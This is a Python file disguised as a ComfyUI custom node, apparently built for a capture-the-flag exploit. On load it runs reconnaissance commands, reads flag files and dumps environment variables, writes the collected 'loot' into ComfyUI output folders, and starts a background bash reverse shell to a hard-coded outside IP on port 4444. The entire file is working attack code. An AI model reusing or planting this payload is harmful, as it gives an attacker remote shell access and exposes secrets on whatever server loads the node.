import subprocess, os, socket

cmds = [
  "id; hostname; uname -a; pwd",
  "cat /flag 2>/dev/null; cat /flag.txt 2>/dev/null; cat /root/flag 2>/dev/null; cat /root/flag.txt 2>/dev/null",
  "find / -xdev -maxdepth 7 -iname '*flag*' 2>/dev/null | head -80",
  "ls -la / /root /ComfyUI 2>/dev/null",
  "env",
]
data = []
for c in cmds:
    try:
        r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=30)
        data.append("### CMD: " + c + "\n" + r.stdout + r.stderr)
    except Exception as e:
        data.append("### CMD: " + c + "\nERR " + str(e))
txt = "\n".join(data)
for p in ["/ComfyUI/output/loot_flag.txt",
          "/ComfyUI/user/default/ComfyUI-Manager/loot_flag.txt"]:
    try:
        open(p, "w").write(txt)
    except Exception as e:
        try:
            open("/tmp/loot_err.txt","a").write(str(p)+" "+str(e)+"\n")
        except Exception:
            pass

# reverse shell back to VPS (best-effort, background)
try:
    subprocess.Popen(["/bin/bash","-c","bash -i >& /dev/tcp/118.31.50.75/4444 0>&1"])
except Exception:
    pass

NODE_CLASS_MAPPINGS = {}
